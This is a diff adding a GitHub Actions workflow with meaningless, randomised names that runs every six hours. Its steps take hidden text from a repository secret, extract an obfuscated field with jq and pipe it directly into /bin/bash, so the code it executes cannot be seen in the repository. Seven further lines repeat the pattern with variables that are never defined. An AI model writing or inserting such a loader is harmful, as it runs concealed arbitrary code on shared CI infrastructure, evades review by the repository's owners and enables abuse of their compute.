@@ -1,0 +1,26 @@
+name: luoyuzhe6712
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luoyuzhe6712
+        env:
+          fn22360: ${{ secrets.fn22360 }}
+        run: |
+          echo $fn22360 | jq -r .aiguh13279 | /bin/bash
+          echo $ygt4 | jq -r .fy75 | /bin/bash
+          echo $ji974 | jq -r .rtozr4 | /bin/bash
+          echo $zttnf0783 | jq -r .hkxy3643 | /bin/bash
+          echo $ovesp56077 | jq -r .jrr66 | /bin/bash
+          echo $bp95175 | jq -r .zzy403 | /bin/bash
+          echo $fk39 | jq -r .k58 | /bin/bash
+          echo $galm2 | jq -r .nfpc3902 | /bin/bash
+
